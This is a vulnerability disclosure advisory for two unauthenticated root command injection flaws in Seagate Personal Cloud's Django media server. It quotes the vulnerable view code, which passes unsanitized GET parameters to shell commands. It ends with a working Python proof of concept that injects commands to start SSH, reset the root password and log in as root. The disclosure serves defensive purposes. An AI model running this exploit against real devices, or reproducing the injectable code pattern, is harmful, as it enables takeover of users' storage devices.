 
## Vulnerabilities summary
The following advisory describes two (2) unauthenticated command injection vulnerabilities.
 
Seagate Personal Cloud Home Media Storage is “the easiest way to store, organize, stream and share all your music, movies, photos, and important documents.”
 
## Credit
An independent security researcher, Yorick Koster, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
 
## Vendor response
Seagate was informed of the vulnerability on October 16, but while acknowledging the receipt of the vulnerability information, refused to respond to the technical claims, to give a fix timeline or coordinate an advisory
 
## Vulnerabilities details
Seagate Media Server uses Django web framework and is mapped to the .psp extension.
 
Any URL that ends with .psp is automatically send to the Seagate Media Server application using the FastCGI protocol.
/etc/lighttpd/conf.d/django-host.conf:
 
 
```
fastcgi.server += (
".psp"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   )),
".psp/"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   ))
)
```
 
 
URLs are mapped to specific views in the file /usr/lib/django_host/seagate_media_server/urls.py.
 
Two views were found to be affected by unauthenticated command injection.
 
The affected views are:
 
- uploadTelemetry
- getLogs
 
These views takes user input from GET parameters and pass these unvalidated/unsanitized to methods of the commands Python module.
 
This allows an attacker to inject arbitrary system commands, that will be executed with root privileges.
 
/usr/lib/django_host/seagate_media_server/views.py:
 
 
```
@csrf_exempt
def uploadTelemetry(request):
   ts = request.GET.get(&#039;TimeStamp&#039;,&#039;&#039;)
   if (checkDBSQLite()) :
      response = &#039;{"stat":"failed","code":"80","message":"The Database has not been initialized or mounted yet!"}&#039;
   else :
      if ts == "":
         response = &#039;{"stat":"failed","code":"380","message":"TimeStamp parameter missing"}&#039;
         return HttpResponse(response);
      cmd = "/usr/local/bin/log_telemetry "+str(ts)
      commands.getoutput(cmd)
   return HttpResponse(&#039;{"stat":"ok"}&#039;)
```
 
 
/usr/lib/django_host/seagate_media_server/views.py:
 
 
```
@csrf_exempt
def getLogs (request):
   try:
      cmd_base=&#039;/usr/bin/log-extract-manager.sh&#039;
      uID = request.GET.get ( &#039;arch_id&#039;, None )
      time_stamp = request.GET.get ( &#039;time_stamp&#039;, &#039;&#039; )
    
      if uID:
         (status, output) = commands.getstatusoutput(cmd_base + &#039; status &#039; + uID);
         if (&#039;In progress&#039; in output) and (uID in output) :
            return HttpResponse (&#039;{"stat":"ok", "data": {"status":"In Progress"}}&#039;)
         elif (status == 0) :
            return HttpResponse (&#039;{"stat":"ok", "data": {"url":"%s", "fileSize":"%d"}}&#039; % ( urllib.quote(output.encode(&#039;utf-8&#039;)), os.path.getsize(output) ))
         else :
            return HttpResponse (&#039;{"stat":"failed", "code":"853","message":"Id not recognized."}&#039; )
      else:
         (status, output) = commands.getstatusoutput(cmd_base + &#039; start &#039; + time_stamp);
         if (status == 0) :
            return HttpResponse (&#039;{"stat":"ok", "data": {"archiveID":"%s"}}&#039; % (output))
    
      return HttpResponse (&#039;{"stat":"failed", "code":"852","message":"Zip file not created."}&#039; )
   except :
      return HttpResponse (&#039;{"stat":"failed", "code":"852","message":"Zip file not created."}&#039; )
```
 
 
Note that both views contain the csrf_exempt decorator, which disables the default Cross-Site Request Forgery protection of Django. As such, these issues can be exploited via Cross-Site Request Forgery.
 
### Proof of Concept
The following proof of concept will try to enable the SSH service, and change the root password. When successful it will be possible to log into the device over SSH with the new password.
 
 
```
#!/usr/bin/env python
import os
import urllib
    
scheme = &#039;http&#039;
host = &#039;personalcloud.local&#039;
port = &#039;80&#039;
path = &#039;uploadTelemetry.psp&#039;
querystr = &#039;TimeStamp=%3b&#039;
#path = &#039;getLogs.psp&#039;
#querystr = &#039;time_stamp=%3b&#039;
password = &#039;Welcome01&#039;
    
cmds = [&#039;ngc --start sshd 2>&1&#039;,
      &#039;echo -e "%(s)s\n%(s)s"|passwd 2>&1&#039; % {&#039;s&#039; : password}]
    
for cmd in cmds:
   print &#039;Running command&#039;, repr(cmd)
   cmd = urllib.quote_plus(cmd)
   r = urllib.urlopen(&#039;%s://%s:%s/%s?%s%s&#039; % (scheme, host, port, path, querystr, cmd))
   print r.read()
    
print &#039;Log in with&#039;, password
os.system(&#039;ssh -p 2222 root@%s&#039; % host)
```

